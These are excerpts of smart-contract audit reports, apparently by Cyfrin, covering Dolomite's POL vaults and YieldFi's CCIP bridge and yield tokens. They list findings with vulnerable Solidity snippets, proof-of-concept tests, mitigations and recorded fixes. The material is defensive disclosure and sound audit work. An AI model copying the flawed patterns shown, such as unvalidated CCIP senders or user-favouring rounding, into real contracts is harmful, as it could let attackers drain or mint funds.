      await increase(ONE_DAY_SECONDS * 30);

      // Pause staking in the InfraredVault
      await testInfraredVault.pauseStaking();
      expect(await testInfraredVault.paused()).to.be.true;

      //Calling getReward should revert because reinvesting iBGT rewards will fail due to staking being paused
      await expectThrow(
        iBgtVault.getReward()
      );


      // Verify balances remain unchanged
      await expectWalletBalance(iBgtVault, core.tokens.iBgt, ZERO_BI);
      await expectProtocolBalance(core, iBgtVault, defaultAccountNumber, iBgtMarketId, amountWei);

      // Unpause to allow normal operation to continue
      await testInfraredVault.unpauseStaking();
      expect(await testInfraredVault.paused()).to.be.false;

      // Now getReward should succeed
      await iBgtVault.getReward();
      await expectWalletBalance(iBgtVault, core.tokens.iBgt, ZERO_BI);
      await expectProtocolBalance(core, iBgtVault, defaultAccountNumber, iBgtMarketId, amountWei.add(rewardAmount));

      // Verify the reward was restaked
      expect(await testInfraredVault.balanceOf(iBgtVault.address)).to.eq(amountWei.add(rewardAmount));
    });
```


**Recommended Mitigation:** Consider checking if the BGT staking vault is `paused` before attempting to re-invest the rewards. If vault is paused, rewards can either be retained in the vault or transferred back to the vault owner.

**Dolomite:** Fixed in [7b83e77](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/7b83e778d739c9afb039a8a8d4fe06d931f4bb22).

**Cyfrin:** Verified

\clearpage
## Informational


### Redundant check for non-zero reward amount in `_handleRewards` function

**Description:** In `InfraredBGTIsolationModeTokenVaultV1.sol`, the `_handleRewards` function includes a redundant check for positive reward amounts, as shown below:

```solidity
//InfraredBGTIsolationModeTokenVaultV1.sol
function _handleRewards(IInfraredVault.UserReward[] memory _rewards) internal {
    IIsolationModeVaultFactory factory = IIsolationModeVaultFactory(VAULT_FACTORY());
    for (uint256 i = 0; i < _rewards.length; ++i) {
        if (_rewards[i].amount > 0) {  // <-- This check is redundant
            if (_rewards[i].token == UNDERLYING_TOKEN()) {
                _setIsDepositSourceThisVault(true);
                factory.depositIntoDolomiteMargin(
                    DEFAULT_ACCOUNT_NUMBER,
                    _rewards[i].amount
                );
                assert(!isDepositSourceThisVault());
            } else {
                // ... rest of function
            }
        }
    }
}
```

This check is redundant because the getAllRewardsForUser function in the [InfraredVault](https://berascan.com/address/0x67b4e6721ad3a99b7ff3679caee971b07fd85cd1#code) only returns rewards with a positive amount:

```solidity
// InfraredVault.sol
function getAllRewardsForUser(address _user) external view returns (UserReward[] memory) {
    uint256 len = rewardTokens.length;
    UserReward[] memory tempRewards = new UserReward[](len);
    uint256 count = 0;
    for (uint256 i = 0; i < len; i++) {
        uint256 amount = earned(_user, rewardTokens[i]);
        if (amount > 0) {  // @audit <-- Already filtering for positive amounts
            tempRewards[count] = UserReward({token: rewardTokens[i], amount: amount});
            count++;
        }
    }
    // Create a new array with the exact size of non-zero rewards
    UserReward[] memory userRewards = new UserReward[](count);
    for (uint256 j = 0; j < count; j++) {
        userRewards[j] = tempRewards[j];
    }
    return userRewards;
}
```

**Recommended Mitigation:** Consider removing the redundant check.

**Dolomite:**
No longer applicable. Code changed a good bit because of bricked rewards fix

**Cyfrin**
Acknowledged.



### Inconsistent ETH handling pattern in Proxy Contracts

**Description:** There is an inconsistency in how proxy contracts handle incoming ETH transactions through their `receive()` and `fallback()` functions. Some proxy contracts delegate both functions to their implementation, while others only delegate the fallback() function while leaving the receive() function empty.

For example, in `MetaVaultUpgradeableProxy.sol`, both functions delegate:

```solidity
// MetaVaultUpgradeableProxy
receive() external payable requireIsInitialized {
    _callImplementation(implementation());
}

fallback() external payable requireIsInitialized {
    _callImplementation(implementation());
}
```

Whereas in `POLIsolationModeWrapperUpgradeableProxy.sol`  and `POLIsolationModeUnwrapperUpgradeableProxy`, only the `fallback()` function delegates:

```solidity
// POLIsolationModeWrapperUpgradeableProxy
receive() external payable {} // solhint-disable-line no-empty-blocks

fallback() external payable {
    _callImplementation(implementation());
}
```

While this is a design choice and not a security issue per se, it could lead to potential confusion among developers who might expect all proxies to handle ETH transfers in a similar manner.

**Recommended Mitigation:** Consider documenting the chosen approach and reasoning in the contract comments to clarify the intended behavior for other developers.

**Dolomite:** Fixed [d4ceeef](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/d4ceeefc9c2a5b8c51c8ea77512e499a2e0bc811).

**Cyfrin:** Verified.


### Missing event emissions for some important state changes

**Description:** The POL contracts are missing event emissions for several important state-changing operations.


_1. POLIsolationModeTokenVaultV1_

- `prepareForLiquidation`: No event when a position is prepared for liquidation
- `stake/unstake`: No event for (un)staking actions
- `getReward`: No event for reward claims
- `exit`:  No event for exiting positions

_2. InfraredBGTMetaVault_
- `chargeDTokenFee`: No event for fee charging

_3. POLIsolationModeTraderBaseV2_
- `_POLIsolationModeTraderBaseV2__initialize`:  No event when vault factory is set

_4. MetaVaultRewardTokenFactory_
- `depositIntoDolomiteMarginFromMetaVault`: No event for deposit from meta vault
- `depositIntoDolomiteMarginFromMetaVault`: No event for deposit of other token from meta vault


**Recommended Mitigation:** Consider reviewing the codebase and adding events that track important state changes.


**Dolomite:** Fixed in [e556252](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/e556252bc49d222ea80540242f832fc996711c26) and [ccfcd12](https://github.com/dolomite-exchange/dolomite-margin-modules/commit/ccfcd1278afafae355020bdee4673c792687a109).

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### `_handleRewards` gas optimisation

**Description:** `InfraredBGTMetaVault._performDepositRewardByRewardType` is a function that will be called every time rewards are fetched from Infrared vault. The function can be optimized as follows:

- Remove the reward amount > 0 check (as listed in [*Redundant check for non-zero reward amount in `_handleRewards` function*](#redundant-check-for-nonzero-reward-amount-in-handlerewards-function) )
- Cache frequently used functions `DOLOMITE_MARGIN()`, `OWNER()`
- Cache reward token and reward amount at the start of the loop
- Use unchecked integer for incrementing reward counter


**Recommended Mitigation:** Consider using the below optimized version:

```solidity
function _handleRewards(IInfraredVault.UserReward[] memory _rewards) internal {
    IIsolationModeVaultFactory factory = IIsolationModeVaultFactory(VAULT_FACTORY());
    address owner = OWNER();
    IDolomiteMargin dolomiteMargin = DOLOMITE_MARGIN();

    for (uint256 i = 0; i < _rewards.length;) {
        //@audit Removed redundant check since InfraredVault only sends non-zero rewards
        address rewardToken = _rewards[i].token;
        uint256 rewardAmount = _rewards[i].amount;

        if (rewardToken == UNDERLYING_TOKEN()) {
            _setIsDepositSourceThisVault(true);
            factory.depositIntoDolomiteMargin(
                DEFAULT_ACCOUNT_NUMBER,
                rewardAmount
            );
            assert(!isDepositSourceThisVault());
        } else {
        try dolomiteMargin.getMarketIdByTokenAddress(rewardToken) returns (uint256 marketId) {
                        IERC20(rewardToken).safeApprove(address(dolomiteMargin), rewardAmount);
                        try factory.depositOtherTokenIntoDolomiteMarginForVaultOwner(
                            DEFAULT_ACCOUNT_NUMBER,
                            marketId,
                           rewardAmount
                        ) {} catch {
                            IERC20(rewardToken).safeApprove(address(dolomiteMargin), 0);
                            IERC20(rewardToken).safeTransfer(owner, rewardAmount);
                        }
                    } catch {
                        IERC20(rewardToken).safeTransfer(owner,  rewardAmount);
                    }
        }
        unchecked { ++i; }
    }
}
```


**Dolomite:**
No longer applicable. Code changed a good bit because of bricked rewards fix.

**Cyfrin:** Acknowledged.

\clearpage

------ FILE END car/reports_md/2025-04-24-cyfrin-dolomite-POLVaults-v2.0.md ------


------ FILE START car/reports_md/2025-04-24-cyfrin-yieldfi-v2.0.md ------

**Lead Auditors**

[Immeas](https://twitter.com/0ximmeas)

[Jorge](https://x.com/TamayoNft)

---

# Findings
## Critical Risk


### Missing source validation in CCIP message handling

**Description:** YieldFi integrates with Chainlink CCIP to facilitate cross-chain transfers of its yield tokens (`YToken`). This functionality is handled by the `BridgeCCIP` contract, which manages token accounting for these transfers.

However, in the [`BridgeCCIP::_ccipReceive`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L160-L181) function, there is no validation of the message sender from the source chain:
```solidity
/// handle a received message
function _ccipReceive(Client.Any2EVMMessage memory any2EvmMessage) internal override {
    bytes memory message = abi.decode(any2EvmMessage.data, (bytes)); // abi-decoding of the sent text
    BridgeSendPayload memory payload = Codec.decodeBridgeSendPayload(message);
    bytes32 _hash = keccak256(abi.encode(message, any2EvmMessage.messageId));
    require(!processedMessages[_hash], "processed");

    processedMessages[_hash] = true;

    require(payload.amount > 0, "!amount");

    ...
}
```

As a result, an attacker could craft a malicious `Any2EVMMessage` containing valid data and trigger the minting or unlocking of arbitrary tokens by sending it through CCIP to the `BridgeCCIP` contract.


**Impact:** An attacker could drain the bridge of tokens on L1 or mint an unlimited amount of tokens on L2. While a two-step redeem process offers some mitigation, such an exploit would still severely disrupt the protocols accounting and could be abused when claiming yield for example.

**Recommended Mitigation:** Consider implementing validation to ensure that messages are only accepted from trusted peers on the source chain:
```solidity
mapping(uint64 sourceChain => mapping(address peer => bool allowed)) public allowedPeers;
...
function _ccipReceive(
    Client.Any2EVMMessage memory any2EvmMessage
) internal override {
    address sender = abi.decode(any2EvmMessage.sender, (address));
    require(allowedPeers[any2EvmMessage.sourceChainSelector][sender],"allowed");
    ...
```

**YieldFi:** Fixed in commit [`a03341d`](https://github.com/YieldFiLabs/contracts/commit/a03341d8103ba08473ea1cd39e64192608692aca)

**Cyfrin:** Verified. `sender` is now verified to be a trusted sender.


### All CCIP messages reverts when decoded

**Description:** YieldFi has integrated Chainlink CCIP alongside its existing LayerZero support to enable cross-chain token transfers using multiple messaging protocols. To support this, a custom message payload is used to indicate the token transfer. This payload is decoded in [`Codec::decodeBridgeSendPayload`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Codec.sol#L22-L51) as follows:
```solidity
(uint32 dstId, address to, address token, uint256 amount, bytes32 trxnType) = abi.decode(_data, (uint32, address, address, uint256, bytes32));
```
This same decoding logic is reused for CCIP message processing.

However, Chainlink uses a `uint64` for `dstId`, and their chain IDs (e.g., [Ethereum mainnet](https://docs.chain.link/ccip/directory/mainnet/chain/mainnet)) all exceed the `uint32` range. For instance, Ethereums CCIP chain ID is `5009297550715157269`, which is well beyond the limits of `uint32`.

**Impact:** All CCIP messages will revert during decoding due to the overflow when casting a `uint64` value into a `uint32`. Since the contract is not upgradeable, failed messages cannot be retried, resulting in permanent loss of fundstokens may be either locked or burned depending on the sending logic.

**Proof of Concept:** Attempting to process a message with `dstId = 5009297550715157269` in the `CCIP Receive: Should handle received message successfully` test causes the transaction to revert silently. The same behavior is observed when manually decoding a 64-bit value as a 32-bit integer using Remix.

**Recommended Mitigation:** Consider updating the type of `dstId` to `uint64` to match the Chainlink format. This change should be safe, as `dstId` is not used after decoding in the current LayerZero integration.

**YieldFi:** Fixed in commit [`14fc17a`](https://github.com/YieldFiLabs/contracts/commit/14fc17a46702bf0db0efb199c48e52530221612b)

**Cyfrin:** Verified. `dstId` is now a `uint64` in `Codec.BridgeSendPayload`.

\clearpage
## High Risk


### Incorrect `owner` passed to `Manager::redeem` in YToken withdrawal flow

**Description:** YieldFis yield tokens (`YTokens`) implement a more complex withdrawal mechanism than a standard ERC-4626 vault. Instead of executing withdrawals immediately, they defer them to a central `Manager` contract, which queues the request for off-chain processing and later execution on-chain.

As with any ERC-4626 vault, third parties are allowed to initiate a withdrawal or redemption on behalf of a user, provided the appropriate allowances are in place.

However, in [`YToken::_withdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L161-L172), the wrong address is passed to the `manager.redeem` function. The same issue is also present in [`YTokenL2::_withdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L170-L180):
```solidity
// Override _withdraw to request funds from manager
function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares) internal override nonReentrant notPaused {
    require(receiver != address(0) && owner != address(0) && assets > 0 && shares > 0, "!valid");
    require(!IBlackList(administrator).isBlackListed(caller) && !IBlackList(administrator).isBlackListed(receiver), "blacklisted");
    if (caller != owner) {
        _spendAllowance(owner, caller, shares);
    }
    // Instead of burning shares here, just redirect to Manager
    // The share burning will happen during order execution
    // Don't update totAssets here either, as the assets haven't left the system yet
    // @audit-issue `msg.sender` passed as owner
    IManager(manager).redeem(msg.sender, address(this), asset(), shares, receiver, address(0), "");
}
```

In this call, `msg.sender` is passed as the `owner` to `manager.redeem`, even though the correct `owner` is already passed into `_withdraw`. This works as expected when `msg.sender == owner`, but fails in delegated withdrawal scenarios where a third party is acting on the owner's behalf. In such cases, the `manager.redeem` call may revert, or worse, may burn the wrong users tokens if `msg.sender` happens to have shares.


**Impact:** When a third party initiates a withdrawal on behalf of another user (`caller != owner`), the incorrect owner is passed to `manager.redeem`. This can cause the call to revert, blocking the withdrawal. In a worst-case scenario, if `msg.sender` (the caller) also holds shares, it may result in unintended burning of their tokens instead of the intended owner's.

**Proof of Concept:** Place the following test in `yToken.ts` under `describe("Withdraw and Redeem")`, it should pass but fails with `"!balance"`:
```javascript
it("Should handle redeem request through third party", async function () {
  // Grant manager role to deployer for manager operations
  await administrator.grantRoles(MINTER_AND_REDEEMER, [deployer.address]);

  const sharesToRedeem = toN(50, 18); // 18 decimals for shares

  await ytoken.connect(user).approve(u1.address, sharesToRedeem);

  // Spy on manager.redeem call
  const redeemTx = await ytoken.connect(u1).redeem(sharesToRedeem, user.address, user.address);

  // Wait for transaction
  await redeemTx.wait();

  // to check if manager.redeem was called we can check the event of manager contract
  const events = await manager.queryFilter("OrderRequest");
  expect(events.length).to.be.greaterThan(0);
  expect(events[0].args[0]).to.equal(user.address); // owner, who's tokens should be burnt
  expect(events[0].args[1]).to.equal(ytoken.target); // yToken
  expect(events[0].args[2]).to.equal(usdc.target); // Asset
  expect(events[0].args[4]).to.equal(sharesToRedeem); // Amount
  expect(events[0].args[3]).to.equal(user.address); // Receiver
  expect(events[0].args[5]).to.equal(false); // isDeposit (false for redeem)
});
```

**Recommended Mitigation:** Pass the correct `owner` to `manager.redeem` in both `YToken::_withdraw` and `YTokenL2::_withdraw`, instead of using `msg.sender`.

**YieldFi:** Fixed in commit [`adbb6fb`](https://github.com/YieldFiLabs/contracts/commit/adbb6fb27bd23cdedccdaf9c1f484f7780cb354c)

**Cyfrin:** Verified. `owner` is now passed to `manager.redeem`.

\clearpage
## Medium Risk


### Commented-out blacklist check allows restricted transfers

**Description:** In [`PerpetualBond::_update`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L508-L510), the line intended to restrict transfers between non-blacklisted users is currently commented out:

```solidity
function _update(address from, address to, uint256 amount) internal virtual override {
    // Placeholder for Blacklist check
    // require(!IBlackList(administrator).isBlackListed(from) && !IBlackList(administrator).isBlackListed(to), "blacklisted");
```

This effectively disables blacklist enforcement on transfers of `PerpetualBond` tokens.

**Impact:** Blacklisted addresses can freely hold and transfer `PerpetualBond` tokens, bypassing any intended access control or compliance restrictions.

**Recommended Mitigation:** Uncomment the blacklist check in `_update` to enforce transfer restrictions for blacklisted users.

**YieldFi:** Fixed in commit [`a820743`](https://github.com/YieldFiLabs/contracts/commit/a82074332cc1f57eba398100c3a43e8a70a4c8ce)

**Cyfrin:** Verified. Line doing the blacklist check is now uncommented.


### `Manager::_transferFee` returns invalid `feeShares` when `fee` is zero

**Description:** When a user deposits directly into `Manager::deposit`, the protocol fee is calculated via the [`Manager::_transferFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L226-L242) function:

```solidity
function _transferFee(address _yToken, uint256 _shares, uint256 _fee) internal returns (uint256) {
    if (_fee == 0) {
        return _shares;
    }
    uint256 feeShares = (_shares * _fee) / Constants.HUNDRED_PERCENT;

    IERC20(_yToken).safeTransfer(treasury, feeShares);

    return feeShares;
}
```

The issue is that when `_fee == 0`, the function returns the full `_shares` amount instead of returning `0`. This leads to incorrect logic downstream in [`Manager::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L286-L296), where the result is subtracted from the total shares:

```solidity
// transfer fee to treasury, already applied on adjustedShares
uint256 adjustedFeeShares = _transferFee(order.yToken, adjustedShares, _fee);

// Calculate adjusted gas fee shares
uint256 adjustedGasFeeShares = (_gasFeeShares * order.exchangeRateInUnderlying) / currentExchangeRate;

// transfer gas to caller
IERC20(order.yToken).safeTransfer(_caller, adjustedGasFeeShares);

// remaining shares after gas fee
uint256 sharesAfterAllFee = adjustedShares - adjustedFeeShares - adjustedGasFeeShares;
```

If `_fee == 0`, the `adjustedFeeShares` value will incorrectly equal `adjustedShares`, causing `sharesAfterAllFee` to underflow (revert), assuming `adjustedGasFeeShares` is non-zero.

**Impact:** Deposits into the `Manager` contract with a fee of zero will revert if any gas fee is also deducted. In the best-case scenario, the deposit fails. In the worst caseif the subtraction somehow passes uncheckedit could result in zero shares being credited to the user.

**Recommended Mitigation:** Update `_transferFee` to return `0` when `_fee == 0`, to ensure downstream calculations behave correctly:

```diff
  if (_fee == 0) {
-     return _shares;
+     return 0;
  }
```

**YieldFi:** Fixed in commit [`6e76d5b`](https://github.com/YieldFiLabs/contracts/commit/6e76d5beee3ba7a49af6becc58a596a4b67841c3)

**Cyfrin:** Verified. `_transferFee` now returns `0` when `_fee = 0`


### `YtokenL2::previewMint` and `YTokenL2::previewWithdraw` round in favor of user

**Description:** For the L2 `YToken` contracts, assets are not managed directly. Instead, the vaults exchange rate is provided by an oracle, using the exchange rate from L1 as the source of truth.

This architectural choice requires custom implementations of functions like `previewMint`, `previewDeposit`, `previewRedeem`, and `previewWithdraw`, as well as the internal `_convertToShares` and `_convertToAssets`. These have been re-implemented to rely on the oracle-provided exchange rate instead of local accounting.

However, both `previewMint` and `previewWithdraw` currently perform rounding in favor of the user:

- [`YTokenL2::previewMint`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L249-L250):
  ```solidity
  // Calculate assets based on exchange rate
  return (grossShares * exchangeRate()) / Constants.PINT;
  ```
- [`YTokenL2::previewWithdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L261-L262):
  ```solidity
  // Calculate shares needed for requested assets based on exchange rate
  uint256 sharesWithoutFee = (assets * Constants.PINT) / exchangeRate();
  ```

This behavior contradicts the [security recommendations in EIP-4626](https://eips.ethereum.org/EIPS/eip-4626#security-considerations), which advise rounding in favor of the vault to prevent value leakage.

**Impact:** By rounding in favor of the user, these functions allow users to receive slightly more shares or assets than they should. While the two-step withdrawal process limits the potential for immediate exploitation, this rounding error can result in a slow and continuous value leak from the vaultespecially over many transactions or in the presence of automation.

**Recommended Mitigation:** Update `previewMint` and `previewWithdraw` to round in favor of the vault. This can be done by adopting the modified `_convertToShares` and `_convertToAssets` functions with explicit rounding direction, similar to the approach used in the [OpenZeppelin ERC-4626 implementation](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/extensions/ERC4626Upgradeable.sol#L177-L185).

**YieldFi:** Fixed in commit [`a820743`](https://github.com/YieldFiLabs/contracts/commit/a82074332cc1f57eba398100c3a43e8a70a4c8ce)

**Cyfrin:** Verified. the preview functions now utilizes `_convertToShares` and `_convertToAssets` with the correct rounding direction.


### Missing L2 sequencer uptime check in `OracleAdapter`

**Description:** On L2, the `YToken` exchange rate is provided by custom Chainlink oracles. The exchange rate is queried in [`OracleAdapter::fetchExchangeRate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/OracleAdapter.sol#L52-L77):

```solidity
function fetchExchangeRate(address token) external view override returns (uint256) {
    address oracle = oracles[token];
    require(oracle != address(0), "Oracle not set");

    (, /* uint80 roundId */ int256 answer, , /* uint256 startedAt */ uint256 updatedAt /* uint80 answeredInRound */, ) = IOracle(oracle).latestRoundData();

    require(answer > 0, "Invalid price");
    require(updatedAt > 0, "Round not complete");
    require(block.timestamp - updatedAt < staleThreshold, "Stale price");

    // Get decimals and normalize to 1e18 (PINT)
    uint8 decimals = IOracle(oracle).decimals();

    if (decimals < 18) {
        return uint256(answer) * (10 ** (18 - decimals));
    } else if (decimals > 18) {
        return uint256(answer) / (10 ** (decimals - 18));
    } else {
        return uint256(answer);
    }
}
```

However, this protocol is intended to be deployed on L2 networks such as Arbitrum and Optimism, where it's important to verify that the [sequencer is up](https://docs.chain.link/data-feeds/l2-sequencer-feeds). Without this check, if the sequencer goes down, the latest round data may appear fresh, when in fact it is stale, for advanced users submitting transactions from L1.

**Impact:** If the L2 sequencer goes down, oracle data will stop updating. Actually stale prices can appear fresh and be relied upon incorrectly. This could be exploited if significant price movement occurs during the downtime.

**Recommended Mitigation:** Consider implementing a sequencer uptime check, as shown in the [Chainlink example](https://docs.chain.link/data-feeds/l2-sequencer-feeds#example-consumer-contract), to prevent usage of stale oracle data during sequencer downtime.

**YieldFi:** Fixed in commits [`bb26a71`](https://github.com/YieldFiLabs/contracts/commit/bb26a71e9c57685996f6c853af6df6ed961c2f98) and [`e9c160f`](https://github.com/YieldFiLabs/contracts/commit/e9c160fdfd6dd90650c9537fba73c17cb3c53ea5)

**Cyfrin:** Verified. Sequencer uptime is now verified on L2s.


### Direct YToken deposits can lock funds below minimum withdrawal threshold

**Description:** In [`Manager::deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L134-L155), there is a check enforcing a minimum deposit amount inside [`Manager::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L125-L126):

```solidity
uint256 normalizedAmount = _normalizeAmount(_yToken, _asset, _amount);
require(IERC4626(_yToken).convertToShares(normalizedAmount) >= minSharesInYToken[_yToken], "!minShares");
```

A similar check exists in the [redeem flow](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L157-L197), again via [`Manager::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L130):

```solidity
require(_amount >= minSharesInYToken[_yToken], "!minShares");
```

However, no such minimum is enforced when depositing directly into a `YToken`. In both [`YToken::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L140) and [`YTokenL2::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L150), the only requirement is:

```solidity
require(receiver != address(0) && assets > 0 && shares > 0, "!valid");
```

As a result, a user could deposit an amount that results in fewer shares than `minSharesInYToken[_yToken]`, which cannot be withdrawn through the `Manager` due to its minimum withdrawal check, effectively locking their funds.

**Impact:** Users can bypass the minimum share threshold by depositing directly into a `YToken`. If the resulting share amount is below the minimum allowed for withdrawal via the `Manager`, the user will be unable to exit their position. This can lead to unintentionally locked funds and a poor user experience.

**Recommended Mitigation:** Consider enforcing the `minSharesInYToken[_yToken]` threshold in `YToken::_deposit` and `YTokenL2::_deposit` to prevent deposits that are too small to be withdrawn. Additionally, consider validating post-withdrawal balances to ensure users are not left with non-withdrawable "dust" (i.e., require remaining shares to be either `0` or `> minSharesInYToken[_yToken]`).

**YieldFi:** Fixed in commit [`221c7d0`](https://github.com/YieldFiLabs/contracts/commit/221c7d0644af8fcb4d229d3e95e45323dc6f99a6)

**Cyfrin:** Verified. Minimum shares is now verified in the YToken contracts. Manager also verifies that there is no dust left after redeem.

\clearpage
## Low Risk


### Hardcoded `extraArgs` violates CCIP best practices

**Description:** When sending cross-chain messages via CCIP, Chainlink recommends keeping the `extraArgs` parameter mutable to allow for future upgrades or configuration changes, as outlined in their [best practices](https://docs.chain.link/ccip/best-practices#using-extraargs).

However, this recommendation is not followed in [`BridgeCCIP::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L126-L133), where `extraArgs` is hardcoded:
```solidity
// Sends the message to the destination endpoint
Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
    receiver: abi.encode(_receiver), // ABI-encoded receiver address
    data: abi.encode(_encodedMessage), // ABI-encoded string
    tokenAmounts: new Client.EVMTokenAmount[](0), // Empty array indicating no tokens are being sent
    // @audit-issue `extraArgs` hardcoded
    extraArgs: Client._argsToBytes(Client.EVMExtraArgsV2({ gasLimit: 200_000, allowOutOfOrderExecution: true })),
    feeToken: address(0) // For msg.value
});
```

**Impact:** Because `extraArgs` is hardcoded, any future changes would require deploying a new version of the bridge contract.

**Recommended Mitigation:** Consider making `extraArgs` mutable by either passing it as a parameter to the `send` function or deriving it from configurable contract storage.

**YieldFi:** Fixed in commits [`3cc0b23`](https://github.com/YieldFiLabs/contracts/commit/3cc0b2331c35327a43e95176ce6c5578f145c0ee) and [`fd4b7ab5`](https://github.com/YieldFiLabs/contracts/commit/fd4b7ab57a5ae2ac366b4d9d086eb372defc7f8c)

**Cyfrin:** Verified. `extraArgs` is now passed as a parameter to the call.


### Static `gasLimit` will result in overpayment

**Description:** Since [unspent gas is not refunded](https://docs.chain.link/ccip/best-practices#setting-gaslimit), Chainlink recommends carefully setting the `gasLimit` within the `extraArgs` parameter to avoid overpaying for execution.

In [`BridgeCCIP::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L131), the `gasLimit` is hardcoded to `200_000`, which is also Chainlinks default:

```solidity
extraArgs: Client._argsToBytes(Client.EVMExtraArgsV2({ gasLimit: 200_000, allowOutOfOrderExecution: true })),
```

This hardcoded value directly affects every user bridging tokens, as they will be consistently overpaying for execution costs on the destination chain.

**Recommended Mitigation:** A more efficient approach would be to measure the gas usage of the `_ccipReceive` function using tools like Hardhat or Foundry and set the `gasLimit` accordinglyadding a margin for safety. This ensures that the protocol avoids overpaying for gas on every cross-chain message.

This issue also reinforces the importance of making `extraArgs` mutable, so the gas limit and other parameters can be adjusted if execution costs change over time (e.g., due to protocol upgrades like [EIP-1884](https://eips.ethereum.org/EIPS/eip-1884)).

**YieldFi:** Fixed in commit [`3cc0b23`](https://github.com/YieldFiLabs/contracts/commit/3cc0b2331c35327a43e95176ce6c5578f145c0ee)

**Cyfrin:** Verified. `extraArgs` is now passed as a parameter to the call.


### Unverified `_receiver` can cause irrecoverable token loss

**Description:** When a user bridges their YTokens using CCIP, they call [`BridgeCCIP::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L117-L158). One of the parameters passed to this function is `_receiver`, which is intended to be the destination contract on the receiving chain:

```solidity
function send(address _yToken, uint64 _dstChain, address _to, uint256 _amount, address _receiver) external payable notBlacklisted(msg.sender) notBlacklisted(_to) notPaused {
    require(_amount > 0, "!amount");
    require(lockboxes[_yToken] != address(0), "!token !lockbox");
    require(IERC20(_yToken).balanceOf(msg.sender) >= _amount, "!balance");
    require(_to != address(0), "!receiver");
    require(tokens[_yToken][_dstChain] != address(0), "!destination");

    bytes memory _encodedMessage = abi.encode(_dstChain, _to, tokens[_yToken][_dstChain], _amount, Constants.BRIDGE_SEND_HASH);

    // Sends the message to the destination endpoint
    Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
        // @audit-issue `_receiver` not verified
        receiver: abi.encode(_receiver), // ABI-encoded receiver address
        data: abi.encode(_encodedMessage), // ABI-encoded string
        tokenAmounts: new Client.EVMTokenAmount[](0), // Empty array indicating no tokens are being sent
        extraArgs: Client._argsToBytes(Client.EVMExtraArgsV2({ gasLimit: 200_000, allowOutOfOrderExecution: true })),
        feeToken: address(0) // For msg.value
    });
```

However, the `_receiver` parameter is not validated. If the user provides an incorrect or malicious address, the message may be delivered to a contract that cannot handle it, resulting in unrecoverable loss of the bridged tokens.

**Recommended Mitigation:** Validate the `_receiver` address against a trusted mapping, such as the `peers` mapping mentioned in a previous finding, to ensure it corresponds to a legitimate contract on the destination chain.

**YieldFi:** Fixed in commit [`a03341d`](https://github.com/YieldFiLabs/contracts/commit/a03341d8103ba08473ea1cd39e64192608692aca)

**Cyfrin:** Verified. `_receiver ` is now verified to be a trusted peer.


### Hardcoded CCIP `feeToken` prevents LINK discount usage

**Description:** In `BridgeCCIP::send`, the [`feeToken`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L126-L133) parameter is hardcoded:
```solidity
// Sends the message to the destination endpoint
Client.EVM2AnyMessage memory evm2AnyMessage = Client.EVM2AnyMessage({
    receiver: abi.encode(_receiver), // ABI-encoded receiver address
    data: abi.encode(_encodedMessage), // ABI-encoded string
    tokenAmounts: new Client.EVMTokenAmount[](0), // Empty array indicating no tokens are being sent
    extraArgs: Client._argsToBytes(Client.EVMExtraArgsV2({ gasLimit: 200_000, allowOutOfOrderExecution: true })),
    // @audit-issue hardcoded fee token
    feeToken: address(0) // For msg.value
});
```

